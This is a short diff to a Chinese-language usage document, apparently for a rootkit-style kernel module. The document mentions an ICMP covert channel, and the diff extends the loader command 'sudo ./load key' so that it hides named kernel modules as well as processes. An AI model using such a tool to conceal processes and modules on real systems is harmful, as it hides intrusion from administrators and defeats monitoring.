@@ -52,7 +52,7 @@ icmp隐通道使用例子:
 
 
 使用示例：
-sudo ./load key  ['hidden_base_exe=0 hidden_proc_name="hidden_comm,hidden_comm1"']
+sudo ./load key  ['hidden_base_exe=0 hidden_proc_name="hidden_comm,hidden_comm1" hidden_module_name="hidden_ko,hidden_ko2"']
 
 
 TODO:
